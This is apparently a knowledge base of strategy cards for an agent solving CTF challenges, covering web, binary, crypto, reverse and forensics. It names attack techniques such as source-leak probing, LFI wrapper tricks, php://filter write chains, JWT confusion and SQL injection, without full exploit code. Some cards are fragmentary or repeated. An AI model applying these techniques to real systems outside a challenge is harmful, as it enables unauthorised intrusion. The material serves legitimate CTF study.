cards.title: Scoreboard Speed Lane for early Web CTF scoring
cards.trigger: Fresh online Web CTF challenge, easy/medium-looking target, scoreboard pressure, or first 8-12 minutes before full decision-state workflow.
preconditions: fresh Web target or early scoring phase
no strong evidence that the challenge is already multi-stage/hard
cards.first_safe_check: Run the speed lane order: challenge/page clues; robots/sitemap/.well-known; .git/.phps/~/.bak/.swp/.zip/source maps/backup/debug/config; JS/env/admin paths/GraphQL ops; default or clue-derived creds; weak cookie/JWT shape; obvious file read/source/debug/SQL/LFI/upload/admin-token; direct artifact flag grep.
cards.oracle: Direct flag/source/secret/admin-token path or a clear decision to enter full workflow after the time box.
cards.confirm: A direct path appears and can be reproduced minimally.
cards.falsify: Speed lane families are exhausted without direct path and target requires stateful/multi-stage workflow.
cards.stop_rule: Use only 1-2 low-cost probes per speed-lane family; do not deep dive CRLF/XSS/cache/race/request-smuggling/GraphQL unless direct or only clue.
cards.pivot_rule: After 8-12 minutes or no direct path, enter full decision-state workflow.
cards.snippet: For early online scoring, prioritize direct clues/source leaks/static leaks/default creds/obvious primitives for 8-12 minutes, return early if direct path appears, then switch to full workflow.
execution_plan: Run clue and source-surface checks first.
Check JS/source maps/default creds/obvious primitives.
Return early on direct path.
Otherwise switch to full decision-state.
failure_modes: over-processing simple tasks with full workflow
deep-diving medium-value bugs before source/clue checks
missing direct source leak under scoreboard pressure
query_aliases: fast lane direct flag source leak
cards.review_recommendation: keep; addresses over-process risk in strong Web workflow

cards.title: Evidence ledger and replay skeleton gate
cards.trigger: A branch is confirmed or a solve path requires multiple requests, auth state, object IDs, cookies/tokens, GraphQL operations, race windows, upload paths, or workflow steps.
preconditions: state damage is understood or probe is harmless
cards.first_safe_check: Record key URLs, route templates, object IDs, cookies/tokens, roles, request bodies, response oracles, confirmed/falsified hypotheses, then produce minimal curl or Python requests skeleton before deepening.
cards.oracle: A one-variable check confirms state/auth/query/runtime/deployment/replay differential or falsifies the mapped family.
cards.confirm: The check produces a route to source/secret/data/flag, stronger primitive, or reproducible state differential.
cards.falsify: The signal is present but first safe check has no oracle and constraints show the family is not reachable.
cards.stop_rule: Run no more than two same-family probes without new differential; do not skip evidence/replay notes for confirmed branches.
cards.pivot_rule: Pivot to clue/source/primitive-value/framework mapping or next high-yield branch.
cards.snippet: Evidence ledger and replay skeleton gate: A branch is confirmed or a solve path requires multiple requests, auth state, object IDs, cookies/tokens, GraphQL operations, race windows, upload paths, or workflow steps. First safe check: Record key URLs, route templates, object IDs, cookies/tokens, roles, request bodies, response oracles, confirmed/falsified hypotheses, then produce minimal curl or Python requests skeleton before deepening.
execution_plan: Record exact evidence and affected state/input.
Run the first safe check as one variable.
Observe and update decision-state.
If confirmed, create minimal replay skeleton and continue chain.

cards.falsify: Signal is present but first safe check yields no expected oracle and constraints show the family is not reachable.
cards.stop_rule: Do not run payload variants before the first safe check/model is built; downgrade after two no-progress same-family probes.
cards.pivot_rule: Pivot to challenge clue, source availability, primitive value gate, or next framework-specific mapping.

cards.stop_rule: Do not run payload variants before the first safe check/model is built; downgrade after two no-progress same-family probes.
cards.pivot_rule: Pivot to challenge clue, source availability, primitive value gate, or next framework-specific mapping.
cards.snippet: JWT/JWE/OAuth token-shape gate: JWT/JWE/OAuth/OIDC/SAML evidence appears: alg, kid, jku, jwk, weak secret, public key, HS/RS confusion, redirect_uri, state, nonce, issuer, or audience. First safe check: Decode header/payload; classify alg/kid/jku/jwk; test claim significance without forging; look for public keys/JWKS; check kid path lookup and jku host trust; for OAuth test redirect_uri/state/nonce binding.
execution_plan: Record exact evidence signal and related input/state.
Run the first safe check as one variable.
Observe and rerank in ctf-decision-state.
Only then escalate to exploit-specific payloads.
failure_modes: generic black-box fuzzing before framework mapping
over-promoting medium-value findings without a flag/source/data route
query_aliases: JWT kid jku jwk alg confusion
cards.review_recommendation: keep; extracted from ljagiello/ctf-skills and user optimization goals
semantic_ngrams: JWT kid jku jwk alg confusion

cards.title: Admin-bot/XSS promotion gate
cards.trigger: Report/preview/share/admin bot, CSP, storage/cookie clues, same-origin secret endpoint, postMessage sink, or callback oracle appears; XSS/client-side bugs should become main line only with a credible bot/secret route.
preconditions: one observable oracle exists or can be calibrated safely
cards.first_safe_check: Send one harmless canary to learn bot visit, origin, cookies/storage visibility, CSP, and reachable same-origin endpoints before payload variants.
cards.oracle: A controlled one-variable check changes auth/runtime/schema/state/source/secret reachability or falsifies the mapped family.
cards.confirm: Mapped family produces a direct route to source/secret/data/flag, stronger primitive, or clear runtime/authz differential.
cards.falsify: Signal is present but first safe check yields no expected oracle and constraints show the family is not reachable.
cards.stop_rule: Do not run payload variants before the first safe check/model is built; downgrade after two no-progress same-family probes.
cards.pivot_rule: Pivot to challenge clue, source availability, primitive value gate, or next framework-specific mapping.
cards.snippet: Admin-bot/XSS promotion gate: Report/preview/share/admin bot, CSP, storage/cookie clues, same-origin secret endpoint, postMessage sink, or callback oracle appears; XSS/client-side bugs should become main line only with a credible bot/secret route. First safe check: Send one harmless canary to learn bot visit, origin, cookies/storage visibility, CSP, and reachable same-origin endpoints before payload variants.
execution_plan: Record exact evidence signal and related input/state.
Run the first safe check as one variable.

Only then escalate to exploit-specific payloads.

cards.title: Classic dangerous-function to CTF vulnerability mapping
cards.trigger: Source or snippets reveal classic Web dangerous functions or legacy PHP patterns such as addslashes, include/readfile/file_get_contents, file_put_contents, unserialize, preg_replace /e, eval/assert/template render, header Location with input, or raw HTML output.
preconditions: function is on user-controlled or semi-controlled data path
cards.first_safe_check: Map the function to its classic CTF hypothesis before generic exploration: addslashes->wide-byte SQLi; include/readfile/file_get_contents->LFI/wrapper/consumer mismatch; file_put_contents->file-write/filter chain; unserialize->POP; eval/assert/template->RCE/SSTI; header Location input->CRLF/open redirect lower priority; raw HTML->XSS only with bot/secret route.
cards.oracle: A focused hypothesis/probe for the mapped vulnerability family, or falsification by control/reachability constraints.
cards.confirm: The mapped family produces a direct source/data/file/code/flag-relevant oracle.
cards.falsify: Input is not controlled/reachable or mapped family is blocked by confirmed constraints.
cards.stop_rule: Do not do generic black-box branching before applying obvious function mapping.
cards.pivot_rule: If mapping fails, return to source-guided sink audit or next high-value primitive.
cards.snippet: In CTF Web, dangerous function names should immediately trigger classic vulnerability hypotheses instead of broad exploration.
execution_plan: Identify dangerous function and controlled input.
Apply mapping to one focused hypothesis.
Run one safe probe or source reasoning step.
Only then broaden.
failure_modes: seeing addslashes but not testing wide-byte
seeing file_put_contents but missing write adapter
retrieval_intents: addslashes wide byte include file_put_contents unserialize
cards.review_recommendation: keep; confirmed by user retro as needed mapping

cards.title: Primitive value gate for CTF Web main-line selection
cards.trigger: A phenomenon-like Web primitive such as CRLF, stored XSS, open redirect, reflection, weak parser differential, or UI-only response difference is found before a clear route to flag/source/database.
preconditions: no direct two-step route to flag/source/database/privileged state
other high-value source/data/file/SQL branches may exist
cards.first_safe_check: Classify the primitive value: high-value if it can read files/source/database/config, write files, execute code, deserialize, or SSRF to internal/source; medium-value if it is XSS/CRLF/open redirect/reflection/header/UI-only. Promote medium-value only if it has a two-step route to flag/source/database.
cards.oracle: A ranked decision showing whether the primitive moves toward flag/source/database or should be downgraded.
cards.confirm: The primitive clearly unlocks flag/source/database/privileged state within two steps.
cards.falsify: Two probes produce no closer source/database/file/flag evidence.
cards.stop_rule: Downgrade medium-value primitive after two no-progress probes or if cheap high-yield source/data branch remains untested.
cards.pivot_rule: Pivot to challenge clues, source availability, SQL/file/include/unserialize/write/RCE sinks, or classic teaching-vulnerability mapping.
cards.snippet: CTF Web should not let CRLF/XSS/reflection dominate unless they are within two steps of flag/source/database. Rank primitives by CTF yield, not real-world severity.
execution_plan: Label primitive high/medium.
Ask whether it reaches flag/source/database/privileged state within two steps.
If not, downgrade after two no-progress probes.
Promote high-yield source/data/file/SQL branches.
failure_modes: closing CRLF chain without flag route
closing stored XSS without bot/secret path
ignoring cheap source leak while medium-value bug exists
cards.review_recommendation: keep; confirmed by user retro as prioritization miss

cards.title: CTF Web source availability priority gate
cards.trigger: Old PHP, BUU/NSS/training-style challenge, simple artificial app, acquired login state, traditional directory/static layout, many simple interaction points, or black-box chain cost exceeds cheap source acquisition cost.
preconditions: target resembles classic training app or old PHP site
cheap source/data leak surfaces have not been checked
cards.first_safe_check: Check a bounded high-yield source surface set: .git/HEAD, .git/index, .phps, ~, .bak, .swp, .zip, backup/source archives, debug/source/history leaks before deep CRLF/XSS/parser chains.
cards.oracle: Source code, git metadata, backup archive, debug/source leak, or confirmed 404/403/no-leak results for the bounded set.
cards.confirm: Any source/history/config leak or route to recover source appears.
cards.falsify: Bounded source surface set is unavailable and no clue suggests source leak.
cards.stop_rule: Do not continue deep medium-value chains while this cheap source gate is untested.
cards.pivot_rule: After source gate falsifies, return to black-box modeling or strongest high-value primitive.
cards.snippet: In classic CTF Web, cheap source acquisition often outranks long black-box closure. Put .git/.phps/backup/history checks in top hypotheses when source cost is low.
execution_plan: Identify CTF/training/old-PHP signals.
Run bounded source surface checks.
If source leaks, switch to source-guided sink audit.
If falsified, resume black-box hypotheses.
failure_modes: deep CRLF/XSS chain before cheap source checks
treating training-style app like real business app
cards.review_recommendation: keep; confirmed by user retro as missed strategy pattern

cards.title: Challenge clue priority for credential-shaped masks
cards.trigger: A Web page, challenge text, placeholder, error, source comment, or visible UI gives a distinctive username/password-shaped clue such as name***, admin???, masked credential, unusual personal name, or sample login.
preconditions: distinctive clue is visible or leaked
the clue maps to an input such as username, password, token, path, or parameter
generic black-box branches are tempting but clue has not been exhausted
cards.first_safe_check: Build a Clue Ledger and test a bounded structured set derived from the exact clue: literal, prefix/suffix, fixed padding, common numeric/date suffix, case/normalization, leetspeak, username-derived password, and mask length assumptions.
cards.oracle: Login/status/body/error/redirect/session differential for the clue-derived candidates, or evidence that the clue is decoy/noise.
cards.confirm: One clue-derived variant changes auth/session/state or reaches the next stage.
cards.falsify: Bounded clue-first variants produce no differential and the clue has no relation to available inputs.
cards.stop_rule: Do not move to content-type/source-extension/route discovery before the clue-first budget is exhausted or falsified.
cards.pivot_rule: After clue exhaustion, return to normal Web black-box flow: login differential, source leak checks, parser/content-type differentials, route/API modeling.
cards.snippet: Strong page/challenge clues such as zhangwei*** should be treated as structure hints, not just one literal credential attempt. Exhaust a small clue-first budget before generic black-box exploration.
execution_plan: Record exact clue, location, related input, and implied structure.
Generate 3-6 bounded variants from the mask/structure.
Test variants with one stable auth oracle.
Only pivot to generic Web branches after explicit clue exhaustion.
failure_modes: testing only literal username/password then abandoning the clue
generic login differential before clue variants
source-extension/content-type probing while a strong UI clue remains unexplored
cards.review_recommendation: keep; confirmed by user retro as missed priority pattern

cards.title: PHP file_get_contents precheck vs include data: scheme mismatch
cards.trigger: Same page/path parameter is read or validated by file_get_contents and later consumed by include/require, with filters that remove dots or block direct local paths.
preconditions: one concrete wrapper payload failure risks over-pruning the family
cards.first_safe_check: Test exact scheme syntax differential rather than wrapper family broadly: compare data://... with data:,harmless/profile or another harmless data: value that file_get_contents and include may resolve differently.
cards.oracle: Precheck succeeds on harmless data content while include resolves/executes/loads a different local relative tail, or produces a distinct include warning/path.
cards.confirm: A data: form passes the precheck and reaches a different include target or behavior than file_get_contents consumed.
cards.falsify: Both consumers canonicalize and consume the same resource for data: and data:// forms under controlled tests.
cards.stop_rule: Do not pivot to /proc, /flag variants, null byte, or broad path tricks before exact consumer-differential probes are tested.
cards.pivot_rule: If data: mismatch fails, test another single parser differential from the equation: path normalization, wrapper syntax, encoding, or content-type consumer.
cards.snippet: For file_get_contents() followed by include(), do not kill the data-wrapper idea after data:// fails; test exact data: syntax such as data:,harmless/profile as the consumer-differential probe.
execution_plan: Write precheck/sink equation with the same controlled page value.
Compare one harmless data:// payload to one data:,harmless/relative-tail payload.
Observe whether file_get_contents and include consume different resources.
Only after falsification pivot to another semantic mismatch class.
failure_modes: treating one payload failure as class falsification
focusing on making profile naturally executable instead of consumer mismatch
retrieval_intents: data colon vs data slash php
cards.review_recommendation: keep; confirmed by user retro as missed solve pattern

cards.title: PHP file_put_contents to php://filter write base64 execution
cards.trigger: PHP source/gadget exposes file_put_contents or equivalent write sink with controllable path and content, especially after unserialize magic methods or source leak.
preconditions: controlled or partially controlled file path/resource
cards.first_safe_check: Model controlled path/content and test whether the write resource can be changed to php://filter/write=convert.base64-decode/resource=<webroot-or-include-target>; account for dirty PHP prefix/suffix with base64 decoder tolerance or alignment padding.
cards.oracle: Written target decodes controlled payload, include/static access changes, or harmless marker appears without raw dirty prefix breaking decode.
cards.confirm: A harmless base64 marker survives the write adapter and lands in the chosen target/resource.
cards.falsify: Resource path cannot use wrappers, content is not sufficiently controlled, or prefix/suffix cannot be tolerated/aligned after one controlled check.
cards.stop_rule: Do not hunt hidden routes until wrapper-write and target-reachability checks are falsified.
cards.pivot_rule: If filter write fails, test webroot/include target, .user.ini/auto_prepend, session/upload/phar adapter only when reachable.
cards.snippet: Controlled PHP file write should immediately trigger wrapper/filter adapter thinking: php://filter/write=convert.base64-decode/resource=... plus base64 tolerance/alignment for fixed prefixes.
execution_plan: Confirm write sink controls path and content.
Choose harmless marker payload and resource target.
Test php://filter/write=convert.base64-decode/resource=... with prefix/suffix tolerance or alignment.
If marker lands, convert to final executable/read chain.
failure_modes: continuing SSRF/protocol enumeration after source is read
searching hidden deserialize entry before using known gadget
abandoning write sink because of fixed prefix without testing base64 tolerance
retrieval_intents: bypass prefix pollution in written php
cards.review_recommendation: keep; confirmed by user retro as missed solve pattern

cards.title: Primitive composition before new discovery
cards.trigger: A concrete sink, gadget, source leak, SSRF-read source, LFI-read source, file write, include sink, deserialization gadget, or state transition is already known.
preconditions: existing primitive or sink has been identified
next steps are drifting toward hidden routes, more parameters, protocol enumeration, or environment discovery
cards.first_safe_check: Build a Primitive Ledger and run local pattern recall using exact sink/function/protocol names; select the top two chain-closure probes before any broad discovery.
cards.oracle: A composable chain hypothesis with controlled data/path/trigger/oracle, or a falsified blocker proving the primitive cannot be used.
cards.confirm: Existing primitive yields a plausible chain adapter or a one-variable probe with direct progress.
cards.falsify: Top two chain-closure probes are unreachable, untriggerable, or blocked by confirmed constraints.
cards.stop_rule: Do not do more than one cheap new-surface check until chain closure fails.
cards.pivot_rule: If closure fails, pivot to the next known primitive or then resume limited discovery.
cards.snippet: When a concrete primitive/sink is known, close the exploit chain from existing pieces before searching for hidden routes or new bugs.
execution_plan: Write Primitive Ledger: controlled data, path/name, transforms, trigger, execution context, oracle, blockers.
Search exact sink/function names in pattern cards.
Run the top chain-closure probe as one variable.
Only resume discovery after two closure probes are falsified.
failure_modes: continuing recon after a strong sink
treating SSRF source-read as needing more SSRF instead of source-guided closure
retrieval_intents: avoid broad recon after source leak
cards.review_recommendation: keep; confirmed by user retro as missed solve pattern

cards.title: Precheck/sink semantic mismatch
cards.trigger: Same controlled input is validated or read by one component and later consumed by another semantic sink such as include, render, fetch, browser, deserializer, template, file system, or proxy route.
preconditions: source or black-box evidence shows two consumers of same input
direct path is blocked by filter or validator
cards.first_safe_check: Write the precheck/sink equation and test one harmless value that is interpreted differently by the validator and the sink.
cards.oracle: status/body/header/error/state differential between precheck and sink behavior
cards.confirm: One value passes precheck but reaches or changes sink behavior.
cards.falsify: Validator and sink consume identical canonicalized value for all safe tests.
cards.stop_rule: Stop environment enumeration after two no-differential probes; pivot to another mismatch class or primitive.
cards.pivot_rule: If mismatch fails, inspect transform chain/canonicalization or switch to state/authz/file-write primitive.

cards.title: URL parser vs fetcher mismatch
cards.trigger: SSRF, redirect, webhook, callback, image fetch, proxy, or import feature validates a URL before fetching it with a different parser/library.
cards.first_safe_check: Compare relative, same-origin absolute, benign off-origin, scheme-relative, userinfo, encoded host, and trailing-dot forms one at a time.
cards.oracle: Location change, fetch callback, error difference, DNS/log hit, or internal route response
cards.confirm: Validator accepts a value whose fetcher target differs from validator's target.
cards.falsify: All safe variants normalize to same accepted/rejected target.
cards.stop_rule: Max 3 parser variants without new oracle; then pivot to host-header/cache or auth workflow.
cards.pivot_rule: If outbound is blocked, pivot to open redirect/cache/link-generation differential.

cards.title: Object-level authz matrix
cards.trigger: Object IDs, users, tenants, teams, roles, reset tokens, orders, files, notes, or workflow-owned resources appear in routes or APIs.
preconditions: two sessions or two object IDs exist
endpoint exposes object identifier or role-dependent state
cards.first_safe_check: Run owner/non-owner/anonymous matrix on one read-only endpoint, then one state transition if authorized by challenge scope.
cards.oracle: status/body/schema/field/redirect/state differential across users or objects
cards.confirm: Non-owner accesses or mutates owner resource, or role boundary changes without expected guard.
cards.falsify: All tested object/session combinations enforce expected boundary.
cards.stop_rule: Stop after one object family with no differential; pivot to workflow replay or hidden API.
cards.pivot_rule: If read is safe but write is guarded, test skip-step/replay on workflow transition.

cards.title: Admin bot runtime first
cards.trigger: Report/preview/share/admin bot feature, CSP, DOM sink, postMessage, storage, or browser-only network behavior appears.
preconditions: attacker controls content or URL visited by bot
cards.first_safe_check: Run one harmless canary to learn bot visit, origin, CSP, cookies, storage, and network/oracle before payload variants.
cards.oracle: bot hit, callback, DOM/network evidence, storage change, CSP/error signal
cards.confirm: Canary proves privileged browser reaches attacker-controlled content or state.
cards.falsify: No bot visit or no controlled content reachability after one calibrated canary.
cards.stop_rule: Do not send repeated bot payloads without runtime model and oracle.
cards.pivot_rule: If bot is unreachable, pivot to reflected/stored context or server-side primitive.

cards.title: Source/config leak to secret forgery
cards.trigger: Source map, backup, .git, Docker/config, OpenAPI, debug route, stack trace, or exposed config appears.
preconditions: app uses signed cookie/token/session or hidden route
cards.first_safe_check: Extract only high-value config and route/sink map, then test one token/session/route primitive rather than broad source reading.
cards.oracle: successful token decode/forge, hidden route access, source-confirmed direct flag path
cards.confirm: Leaked secret/config unlocks authenticated or direct flag-relevant action.
cards.falsify: Leak contains no secrets, no reachable sinks, and no useful route/state changes.
cards.stop_rule: Stop broad reading after top config/routes/sinks are mapped.
cards.pivot_rule: If no secret, use source to select parser/auth/upload/state primitive.

cards.title: Protection and primitive first
cards.trigger: Native binary/service with crash, memory corruption, or exploitation hint.
preconditions: binary available or remote service behavior reproducible
cards.first_safe_check: Run checksec/file and identify smallest primitive: leak, write, control-flow, shellcode, syscall, or win function before building chain.
cards.oracle: controlled crash, leaked address, overwrite confirmation, or win path reachability
cards.confirm: Primitive is reproducible locally or remotely with a stable oracle.
cards.falsify: No control over crash/leak/write after minimal triage; reverse behavior first.
cards.stop_rule: Do not ROP/heap-groom before primitive and protections are known.
cards.pivot_rule: If behavior unclear, pivot to reverse; if crypto/web gate blocks exploit, pivot category.

cards.title: Format string leak before write
cards.trigger: printf-style user-controlled format, %p/%x/%s behavior, stack leak, GOT/libc target, or blind format string oracle.
preconditions: output or side effect is observable
cards.first_safe_check: Find offset and leak stack/libc/PIE/canary with read-only specifiers before any write specifier.
cards.oracle: stable leaked pointer or stack value matching expected memory region
cards.confirm: Offset and at least one useful base/canary leak are reproducible.
cards.falsify: Input is not treated as format string or output is fully sanitized/no oracle.
cards.stop_rule: Do not overwrite until offset, target, and RELRO/writeability are known.
cards.pivot_rule: If write blocked, use leak for another vulnerability chain or ret2libc.

cards.title: Heap primitive before gadget hunting
cards.trigger: UAF, double-free, overflow into heap metadata, tcache/fastbin/unsorted bin, custom allocator, FSOP, or FILE structure.
preconditions: allocator/libc or custom allocator behavior identifiable
cards.first_safe_check: Identify allocation/free/edit/show primitives and reproduce one leak, overlap, double-free, or arbitrary write condition.
cards.oracle: heap/libc leak, overlapped chunk, poisoned pointer, controlled write target, or FILE leak
cards.confirm: A heap primitive is repeatable across clean runs.
cards.falsify: No controlled heap state change or oracle after minimal menu/state mapping.
cards.stop_rule: Do not jump to one_gadget before leak/write and constraints are known.
cards.pivot_rule: If allocator path is too opaque, reverse menu/state or use dynamic tracing.

cards.title: RSA weakness triage matrix
cards.trigger: RSA parameters n/e/c, public key, multiple moduli/ciphertexts, leaked dp/dq/phi, small exponent, close primes, shared primes, or oracle.
preconditions: RSA-like integers or key material available
cards.first_safe_check: Run structured RSA triage: bit sizes, small factors, gcd across moduli, small e root/broadcast, Fermat close primes, dp/dq/phi leak, common modulus, Coppersmith indicators.
cards.oracle: factorization, plaintext recovery, private exponent recovery, or successful decryption/signature forgery
cards.confirm: One weakness recovers p/q/d/plaintext or forges required signature.
cards.falsify: All cheap RSA checks fail and no oracle/partial leak exists.
cards.stop_rule: Do not brute-force large RSA; pivot to partial leakage/lattice/oracle only with evidence.
cards.pivot_rule: If RSA clean, inspect encoding/protocol or implementation for side-channel/oracle.

cards.title: Nonce, IV, or PRNG state reuse
cards.trigger: Repeated nonce/IV, predictable seed, time seed, LCG/MT/LFSR/xorshift, DSA/ECDSA k reuse, stream cipher key reuse, or multiple ciphertexts under same keystream.
cards.first_safe_check: Compare samples for repeated nonce/IV/keystream or recover PRNG state from outputs using known format/prefix.
cards.oracle: recovered keystream, seed, state, private key, plaintext, or valid forgery
cards.confirm: Predicted next output, decrypted plaintext, or forged signature validates recovered state/key.
cards.falsify: No repeated/predictable state and insufficient outputs for recovery.
cards.stop_rule: Stop blind seed brute-force if time/window/source evidence is absent.
cards.pivot_rule: Pivot to mode misuse, padding oracle, or algebraic structure.

cards.title: Block cipher mode misuse and oracle
cards.trigger: AES/CBC/ECB/GCM/OFB/CTR with padding errors, repeated IV/nonce, block alignment, chosen plaintext/ciphertext, or MAC/encryption confusion.
preconditions: cipher mode or oracle behavior observable
cards.first_safe_check: Classify mode behavior with repeated blocks, controlled block changes, padding/error oracle, IV/nonce reuse, or tag verification differences.
cards.oracle: padding/error branch, repeated block pattern, valid forged token, decrypted block, or tag/key relation
cards.confirm: One block/bitflip/oracle step changes plaintext/auth state predictably.
cards.falsify: Mode is authenticated and nonce/IV/oracle misuse absent under available samples.
cards.stop_rule: Do not enumerate payloads without a block/mode equation.
cards.pivot_rule: Pivot to KDF/PRNG/hash or protocol state if mode checks fail.

cards.title: Validation slice to solver
cards.trigger: Binary/APK/WASM/client validates flag/license/key with transforms, constants, comparisons, tables, or state machine.
cards.first_safe_check: Locate validation slice via strings/xrefs/runtime trace, extract constants and transforms, then lift only that slice to Python/z3 instead of decompiling the whole program.
cards.oracle: solver output accepted by binary or runtime oracle advances one byte/state
cards.confirm: Extracted model predicts accepted/rejected inputs or recovers flag bytes.
cards.falsify: Slice is not validation or model fails on known samples.
cards.stop_rule: Stop reading unrelated framework/UI code once validation slice is found.
cards.pivot_rule: If validation is cryptographic, pivot to crypto; if exploitation needed, pivot to pwn.

cards.title: Custom VM dispatch and trace
cards.trigger: Interpreter loop, bytecode, opcode dispatch, VM registers/state, custom ISA, emulator, game VM, or packed validation VM.
cards.first_safe_check: Identify instruction format, dispatch table, VM state registers/memory, and trace one known input before full devirtualization.
cards.oracle: opcode trace, state transition, comparison branch, or recovered bytecode semantics
cards.confirm: Trace explains at least one validation/output behavior and supports solver/emulator.
cards.falsify: No VM state/dispatch relation found after tracing key loop.
cards.stop_rule: Do not lift entire VM before instruction format and state are known.
cards.pivot_rule: If VM only wraps crypto/math, pivot to crypto after extracting equations.

cards.title: Layered artifact triage
cards.trigger: Unknown file, archive, image, PDF, disk/memory/pcap/media artifact, embedded object, or multi-stage forensic challenge.
cards.first_safe_check: Run type/magic/metadata/strings/embedded/trailing-data triage, extract safely, then flag-grep before deeper specialized analysis.
cards.oracle: new embedded file, stream, metadata clue, flag fragment, or pivot artifact
cards.confirm: A layer is peeled and produces new evidence or direct flag candidate.
cards.falsify: No embedded/trailing/metadata/string evidence and no format-specific anomaly.
cards.stop_rule: Do not brute stego before cheap metadata/signature/archive/string checks.
cards.pivot_rule: If recovered artifact is crypto/web/binary, pivot category immediately.

cards.title: PCAP stream and protocol first
cards.trigger: Packet capture, DNS/HTTP/TCP/USB/ICMP traffic, credentials, transferred files, covert timing, or multi-stream network artifact.
cards.first_safe_check: Summarize protocols, extract HTTP objects/DNS names/TCP streams/credentials, and only then inspect covert channels or crypto.
cards.oracle: reassembled file, credential, stream payload, domain pattern, timing bits, or flag fragment
cards.confirm: One stream/object/protocol field yields flag-relevant evidence.
cards.falsify: No relevant application streams or payload anomalies.
cards.stop_rule: Do not deep-dive exotic covert channels before normal streams/objects are exhausted.
cards.pivot_rule: If encrypted/compressed payload recovered, pivot crypto/misc/forensics as appropriate.

cards.title: Jail capability model before payloads
cards.trigger: Python jail, bash jail, sandbox, restricted shell, blocked characters, no quotes/calls/imports, or object graph escape.
cards.first_safe_check: Model allowed syntax, builtins, objects, side effects, oracle, and output channel before trying escape payloads.
cards.oracle: new object access, file read, command execution, error branch, or sandbox policy bypass
cards.confirm: One capability escalation is proven: string construction, attribute access, import recovery, file read, or command execution.
cards.falsify: Policy prevents all modeled capabilities under safe probes.
cards.stop_rule: Do not paste jail payload catalogs without matching capability constraints.
cards.pivot_rule: If jail is actually web/binary/container, pivot category.

cards.title: Encoding stack as reversible pipeline
cards.trigger: Encoded text/blob, unusual alphabet, repeated transformations, QR/audio/esolang hints, XOR/base/rot/unicode layers.
preconditions: data has structured charset, magic bytes, entropy shift, or known flag prefix
cards.first_safe_check: Identify alphabet/entropy/magic/known-prefix clues and build an automated reversible decode pipeline with checkpoints.
cards.oracle: magic bytes, readable text, valid archive/image, flag prefix, or next-layer format
cards.confirm: One layer decodes to a recognizable format or next transform evidence.
cards.falsify: No reversible transform improves structure or matches expected format.
cards.stop_rule: Stop manual CyberChef-like guessing after a few no-structure transforms; model constraints or pivot artifact type.
cards.pivot_rule: If output becomes crypto/forensics/reverse artifact, pivot category.

cards.title: Spring SpEL file read via FileCopyUtils when shell/I/O is blocked
cards.trigger: Spring Boot Thymeleaf/SpEL template preview or expression sink, WAF blocks Runtime/ProcessBuilder/FileInputStream/flag, or distroless no-shell container.
cards.first_safe_check: Confirm expression type access with harmless marker, then test directory listing or benign file read through Spring/JDK utility classes before flag path.
cards.oracle: evaluated expression, directory listing, file content, or engine-specific error
cards.confirm: Spring utility/JDK file-read expression returns controlled file content.
cards.falsify: Expression not evaluated or type/file access blocked with no alternate context leak.
cards.stop_rule: Do not keep trying Runtime.exec in no-shell/WAF-blocked contexts when file-read works.
cards.pivot_rule: If type access blocked, pivot to model/config/view path leak.

cards.title: Java XMLDecoder is gadget-free text deserialization
cards.trigger: XMLDecoder source/bytecode, XML import endpoint, Java bean XML parser errors, or text XML object construction.
preconditions: controlled XML reaches XMLDecoder or equivalent bean object construction
cards.first_safe_check: Send a harmless XMLDecoder object/error probe to verify parser reachability and oracle before side-effect payloads.
cards.oracle: XMLDecoder-specific error, instantiated benign object, callback, or response side effect
cards.confirm: Controlled XML is parsed by XMLDecoder and can invoke allowed methods/classes.
cards.falsify: XMLDecoder not reachable or XML parser is safe non-object parser.
cards.stop_rule: Do not use binary gadget assumptions for XMLDecoder; first prove text object construction.
cards.pivot_rule: If XMLDecoder absent, inspect XXE or Jackson/Fastjson parser path.

cards.title: HQL to H2 parser mismatch with non-breaking space
cards.trigger: Hibernate/JPA/HQL query with H2 backend, filters block subqueries/spaces/keywords, or parser mismatch clues.
cards.first_safe_check: Verify DB is H2 and query is HQL/JPA, then test one harmless U+00A0 non-breaking-space differential.
cards.oracle: HQL/DB error difference, accepted expression, boolean/error-based differential
cards.confirm: Application/HQL parser and H2 interpret encoded whitespace differently.
cards.falsify: No H2/HQL evidence or U+00A0 has no parsing differential.
cards.stop_rule: Do not apply H2-specific parser bypass to unknown DBs without evidence.
cards.pivot_rule: If mismatch absent, return to source query extraction or MyBatis/JDBC branch.

cards.title: Spring Boot actuator/config exposure before payloads
cards.trigger: Spring Boot, actuator dependency/config, /actuator routes, management endpoints, env/mappings/logfile hints, or exposed debug config.
preconditions: Java Spring Boot service or source/config available
cards.first_safe_check: Verify management base path, endpoint exposure, and auth status for /actuator, /actuator/mappings, /actuator/env, /actuator/logfile using one read-only request each.
cards.oracle: endpoint list, config secret, route map, logfile, env leak, or clear 401/403 boundary
cards.confirm: An actuator/debug endpoint exposes route/config/log evidence or a useful auth boundary.
cards.falsify: Actuator absent or protected with no route/config leak.
cards.stop_rule: Do not brute actuator endpoints; after base endpoints fail, pivot to source/config mapping.
cards.pivot_rule: Use leaked mappings/config to choose Java source-guided sink or auth route.

cards.title: H2 console with config-derived credentials
cards.trigger: H2 dependency, spring.h2.console.enabled, jdbc:h2 URL, /h2-console route, or embedded database config.
preconditions: H2 dependency/config evidence and reachable web route or source
cards.first_safe_check: Check H2 console route and extract JDBC URL/user/password from application config before login attempts.
cards.oracle: H2 console page, config credentials, database access, or route protection status
cards.confirm: Console reachable and credentials/config allow useful DB inspection or control.
cards.falsify: Console disabled/unreachable and no config credential path.
cards.stop_rule: Do not guess many credentials before reading config/defaults and route auth.
cards.pivot_rule: If DB access works, inspect flag/admin/session tables or file aliases only within challenge scope.

cards.title: MyBatis ${} raw SQL reachability
cards.trigger: MyBatis mapper XML/annotation with ${}, ORDER BY/table/column/search substitution, or SQL stack trace.
preconditions: controlled parameter reaches ${} or string SQL
cards.first_safe_check: Trace controller -> service -> mapper and send one harmless SQL differential such as order toggle, quote error, or boolean condition.
cards.oracle: SQL error, changed ordering/count, boolean differential, or source-proven raw query
cards.confirm: Controlled field changes SQL semantics through ${} or concatenation.
cards.falsify: Only #{} prepared binding or unreachable mapper path.
cards.stop_rule: Do not dump data before proving raw substitution and DB type/flag path.
cards.pivot_rule: If no SQL differential, inspect mapper dynamic conditions or another sink.

cards.title: Shiro rememberMe key/config gate before gadgets
cards.trigger: Apache Shiro dependency/config, rememberMe cookie, CookieRememberMeManager, shiro.ini, or Shiro filter chain.
preconditions: Shiro rememberMe behavior or config evidence
cards.first_safe_check: Verify rememberMe cookie processing/tamper oracle and look for key/config/source before any gadget payload.
cards.oracle: rememberMe deletion/tamper behavior, key clue, auth state change, or Shiro-specific error
